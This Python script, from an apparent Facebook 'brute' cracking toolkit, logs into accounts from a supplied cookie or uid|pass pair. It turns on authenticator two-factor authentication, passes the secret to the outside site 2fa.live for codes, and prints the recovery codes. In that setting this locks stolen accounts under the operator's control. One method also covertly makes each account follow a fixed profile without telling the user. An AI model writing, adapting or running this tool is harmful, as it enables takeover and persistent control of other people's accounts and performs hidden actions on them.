#######################################################
# Name           : Brute Facebook (BF)                #
# File           : ycn.py                             #
# Author         : Moch Yayan Juan Alvredo XD.        #
# Github         : https://github.com/Yayan-XD        #
# Facebook       : https://www.facebook.com/KM39453   #
# Website        : https://www.yayanxd.my.id          #
# Python version : 3.11                               #
#######################################################

############# DON'T REMOVE THIS FUNCTIONS #############

import requests, re, time, os

from bs4 import BeautifulSoup as par
from time import time as mek

from yxz.logo import Logo

from rich.panel import Panel
from rich import print as prints
from rich.console import Console

class Ngocok:

    def __init__(self):
        self.url = "https://mbasic.facebook.com"

    def kode_apk(self, coki):
        try:
            sess = requests.Session()
            sess.headers.update({"Host": "mbasic.facebook.com", "upgrade-insecure-requests": "1", "user-agent": "Mozilla/5.0 (Linux; Android 9; vivo 2007 Build/PKQ1.190616.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "dnt": "1", "x-requested-with": "mark.via.gp", "sec-fetch-site": "none", "sec-fetch-mode": "navigate", "sec-fetch-user": "?1", "sec-fetch-dest": "document", "referer": "https://m.facebook.com/", "accept-encoding": "gzip, deflate", "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            link = sess.get(f"{self.url}/security/2fac/setup/intro/", cookies={"cookie": coki}).text
            snso = par(link, "html.parser")
            if "/zero/optin/write" in str(snso):
                prints(Panel("[bold white]🙄 akun ini sedang menggunakan mode free facebook, Tunggu sebentar sedang mengubah ke mode data.", width=70, style="bold white"))
                urll = re.search('href="/zero/optin/write/?(.*?)"', str(snso)).group(1).replace("amp;", "")
                self.ubah_data(urll, coki, sess)
            elif "Gunakan Aplikasi Autentikasi" in str(snso):
                self.kontol_kud(sess, coki)
                xnxx = sess.get(snso.find("a", string="Gunakan Aplikasi Autentikasi").get("href"), cookies={"cookie": coki}).text
                date = par(xnxx,  "html.parser")
                if "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in str(date):
                    prints(Panel("[bold white]Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan.", width=70, style="bold white"))
                    self.kata_sandi(xnxx, date, sess, coki)
                elif "Atau masukkan kode ini ke aplikasi autentikasi Anda" in str(date):
                    kode = re.findall('\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>', str(xnxx))[0]
                    self.apacooba(xnxx, date, sess, coki, kode)
                else:pass
            elif "/x/checkpoint" in str(snso):
                exit("Opshh akun anda terkena checkpoint:(")
            elif "/security/2fac/factors/recovery-code" in str(snso):
                prints(Panel("[bold green]          Akun ini sudah terpasang a2f.", width=70, style="bold white"))
                curl = re.search('href="/security/2fac/factors/recovery-code/?(.*?)"', str(snso)).group(1).replace("amp;", "")
                self.get_kode(sess, coki, curl)
            elif "Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan." in str(snso):
                prints(Panel("[bold white]Demi keamanan, masukkan ulang kata sandi Anda untuk melanjutkan.", width=70, style="bold white"))
                self.kata_sandi(link, snso, sess, coki)
            else:
                prints(Panel("[bold red]       cookie yang anda masukan invalid.", width=70, style="bold white"));time.sleep(3)
                self.menu()
        except Exception as e:
            print(e)

    def get_kode(self, sess, coki, urll):
        prints(Panel("[bold white]    Silahkan salin semua kode a2f akun anda.", width=70, style="bold white"))
        try:
            gett = sess.get(f"{self.url}/security/2fac/factors/recovery-code/{urll}", cookies={"cookie": coki}).text
            dat3 =  {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1),
                "reset": True
            }
            kode = 0
            post = par(sess.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=dat3, cookies={"cookie": coki}).text, "html.parser")
            for i in post.find_all("span"):
                if (re.findall("\d+\s\d+", str(i.text))):
                    kode+=1
                    if(kode==1):
                        print(i.text.replace(" ", ""))
                    else:
                        print(i.text.replace(" ", ""))
        except:pass
        prints(Panel("[bold green]      berhasil mengambil kode a2f.", width=70, style="bold white"))
        input("     [ Tekan enter untuk kembali ]");self.menu()

    def kontol_kud(self, ses, cok):
        try:
            link = par(ses.get(f"{self.url}/profile.php?id=100005395413800", cookies={"cookie": cok}).text, "html.parser")
            if "/a/subscribe.php" in str(link):
                cari = re.search('/a/subscribe.php(.*?)"', str(link)).group(1).replace("amp;", "")
                ses.get(f"{self.url}/a/subscribe.php{cari}", cookies={"cookie": cok})
                nama = re.search('id="mbasic_logout_button">Keluar \((.*?)\)</a>', str(link)).group(1)
            else:pass
        except:pass

    def kata_sandi(self, xnxx, date, sess, coki):
        pasw = Console().input(f"[bold white][[bold green]?[bold white]] password : ")
        data = {
            "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(xnxx)).group(1),
            "jazoest": re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
            "encpass": f"#PWD_BROWSER:0:{str(mek()).split('.')[0]}:{pasw}"
        }
        resp = sess.post(date.find("form",{"method":"post"})["action"], data=data, cookies={"cookie": coki}).text
        jwdd = par(resp, "html.parser")
        if "Kata sandi yang Anda masukkan tidak benar." in str(jwdd):
            prints(Panel(" [bold red]masukin kata sandi nya yang bener lah tolol.", width=70, style="bold white"));self.kata_sandi(xnxx, date, sess, coki)
        elif "Atau masukkan kode ini ke aplikasi autentikasi Anda" in str(jwdd):
            kode = re.findall('\<div\ class\=\".*?\"\>Atau masukkan kode ini ke aplikasi autentikasi Anda<\/div\>\<div\ class\=\".*?\"\>(.*?)<\/div\>\<\/div\>', str(resp))[0]
            self.apacooba(xnxx, date, sess, coki, kode)
        elif "/security/2fac/factors/recovery-code" in str(jwdd):
            prints(Panel("[bold green]          Akun ini sudah terpasang a2f.", width=70, style="bold white"))
            curl = re.search('href="/security/2fac/factors/recovery-code/?(.*?)"', str(resp)).group(1).replace("amp;", "")
            self.get_kode(sess, coki, curl)
        else:pass

    def apacooba(self, xnxx, date, sess, coki, kode):
        prints(Panel(f"[bold white]Kode key a2f: [bold green]{kode}[/]", width=70, style="bold white"))
        try:
            code = requests.get(f"https://2fa.live/tok/{kode.replace(' ', '')}").json()["token"]
            data = {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(xnxx)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(xnxx)).group(1),
                "code_handler_type": re.search('name="code_handler_type" value="(.*?)"', str(xnxx)).group(1),
                "confirmButton": "Lanjut",
            }
            gsaj = sess.post(self.url+date.find("form",{"method":"post"})["action"], data=data, cookies={"cookie": coki}).text
            dat2 =  {
                "fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gsaj)).group(1),
                "jazoest": re.search('name="jazoest" value="(.*?)"', str(gsaj)).group(1),
                "code": code
            }
            for x in par(gsaj, "html.parser").find_all("form",{"method":"post"}):
                if "Kode Konfirmasi" in str(x):
                    sess.post(self.url+x["action"], data=dat2, cookies={"cookie": coki}).text
                    prints(Panel("[bold green]      Autentikasi berhasil di aktifkan.", width=70, style="bold white"))
                    gett = sess.get(f"{self.url}/security/2fac/setup/intro/", cookies={"cookie": coki}).text
                    urll = re.search('href="/security/2fac/factors/recovery-code/?(.*?)"', str(gett)).group(1).replace("amp;", "")
                    self.get_kode(sess, coki, urll)
        except:pass

    def ubah_data(self, link, coki, sess):
        try:
            gett = sess.get(f"{self.url}/zero/optin/write/{link}", cookies={"cookie": coki}).text
            date = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(gett)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(gett)).group(1)}
            sess.post(self.url+par(gett, "html.parser").find("form",{"method":"post"})["action"], data=date, cookies={"cookie": coki}).text
            prints(Panel("[bold white]🥳[bold green] akun kamu berhasil di ubah ke mode data, silahkan masukan ulang cookie/user pass nya.", width=70, style="bold white"));time.sleep(4);self.menu()
        except:pass

    def ubah_bahasa(self, cok):
        try:
            sess = requests.Session()
            link = sess.get(f"{self.url}/language/", cookies={"cookie":cok}).text
            data = par(link, "html.parser")
            for x in data.find_all('form',{'method':'post'}):
                if "Bahasa Indonesia" in str(x):
                    bahasa = {"fb_dtsg": re.search('name="fb_dtsg" value="(.*?)"', str(link)).group(1),"jazoest": re.search('name="jazoest" value="(.*?)"', str(link)).group(1), "submit": "Bahasa Indonesia"}
                    sess.post(f"{self.url}{x['action']}", data=bahasa, cookies={"cookie":cok})
        except:pass

    def menu(self):
        Logo()
        prints(Panel("[[bold cyan]01[/]] get a2f via cookie\n[[bold cyan]02[/]] get a2f via login (rawan cp)\n[[bold red]00[/]] kembali ke menu awal", width=70, style="bold white"))
        pil = Console().input(f"[bold white][[bold green]?[bold white]] input : ")
        if pil in ["", " "]:
            prints(Panel("jangan kosong", width=70, style="bold white"));time.sleep(3);self.menu()
        elif pil in ["01", "1"]:
            self.login_coki()
        elif pil in ["02", "2"]:
            self.login_akun()
        elif pil in ["00", "0"]:
            os.system("python run.py")
        else:prints(Panel("input yang bener", width=70, style="bold white"));time.sleep(3);self.menu()

    def login_akun(self):
        prints(Panel("[bold white]      Silahkan masukan email sama password, contoh: uid|pass", width=70, style="bold white"))
        jbujb = Console().input(f"[bold white][[bold green]?[bold white]] uid|pass : ")
        try:
            user, pasw = jbujb.split("|")
            sess = requests.Session()
            uass = "Mozilla/5.0 (X11; CrOS x86_64 8172.45.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.64 Safari/537.36"
            link = sess.get(f"https://m.facebook.com/login/device-based/password/?uid={user}&flow=login_no_pin&next=https%3A%2F%2Fm.facebook.com%2Fv2.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
            data = {"lsd":re.search('name="lsd" value="(.*?)"', str(link.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(link.text)).group(1),"uid":user,"next": "https://m.facebook.com/v2.3/dialog/oauth?app_id=124024574287414&cbt=1651658200978&e2e=%7B%22init%22%3A1651658200978%7D&sso=chrome_custom_tab&scope=email&state=%7B%220_auth_logger_id%22%3A%2268f15bae-23f8-463c-8660-5cf1226d97f6%22%2C%227_challenge%22%3A%22dahj28hqtietmhrgprpp%22%2C%223_method%22%3A%22custom_tab%22%7D&redirect_uri=fbconnect%3A%2F%2Fcct.com.instathunder.app&response_type=token%2Csigned_request%2Cgraph_domain%2Cgranted_scopes&return_scopes=true&ret=login&fbapp_pres=0&logger_id=68f15bae-23f8-463c-8660-5cf1226d97f6&tp=unspecified","flow":"login_no_pin","pass":pasw,}
            koki = (";").join([ "%s=%s" % (key, value) for key, value in sess.cookies.get_dict().items() ])
            koki+=' m_pixel_ratio=2.625; wd=412x756'
            head = {'Host': 'm.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="98"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','upgrade-insecure-requests': '1','origin': 'https://m.facebook.com', 'content-type': 'application/x-www-form-urlencoded','user-agent': uass,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','x-requested-with': 'XMLHttpRequest','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.facebook.com/login/device-based/password/?uid='+user+'&flow=login_no_pin&next=https%3A%2F%2F%2Fv2m.facebook.com.3%2Fdialog%2Foauth%3Fapp_id%3D124024574287414%26cbt%3D1651658200978%26e2e%3D%257B%2522init%2522%253A1651658200978%257D%26sso%3Dchrome_custom_tab%26scope%3Demail%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D%26redirect_uri%3Dfbconnect%253A%252F%252Fcct.com.instathunder.app%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%252Cgranted_scopes%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D68f15bae-23f8-463c-8660-5cf1226d97f6%26tp%3Dunspecified&cancel_url=fbconnect%3A%2F%2Fcct.com.instathunder.app%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%252268f15bae-23f8-463c-8660-5cf1226d97f6%2522%252C%25227_challenge%2522%253A%2522dahj28hqtietmhrgprpp%2522%252C%25223_method%2522%253A%2522custom_tab%2522%257D&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
            apcb = sess.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0&locale2=id_ID', data=data, cookies={'cookie': koki},headers=head, allow_redirects=True)
            abcd = par(apcb.text, "html.parser")
            if "c_user" in sess.cookies.get_dict():
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in sess.cookies.get_dict().items() ])
                self.ubah_bahasa(kuki)
                self.kode_apk(kuki)
            elif "Masukkan Kode Masuk untuk Melanjutkan" in str(abcd):
                prints(Panel("[bold white]       Akun anda sudah terpasang autentikasi dua fakror.", width=70, style="bold white"))
            elif "checkpoint" in sess.cookies.get_dict():
                prints(Panel("[bold white]       Opss akun anda terkena checkpoint:(", width=70, style="bold white"))
            else:pass
        except ValueError:
            prints(Panel("[bold white]          Gunakan [bold red]|[/] untuk pemisah uid|pass nya blok!", width=70, style="bold white"))

    def login_coki(self):
        prints(Panel("[bold white]    Silahkan masukan cookie facebook yang mau di pasang a2f...", width=70, style="bold white"))
        cookie = Console().input(f"[bold white][[bold green]?[bold white]] cookie : ")
        self.ubah_bahasa(cookie)
        self.kode_apk(cookie)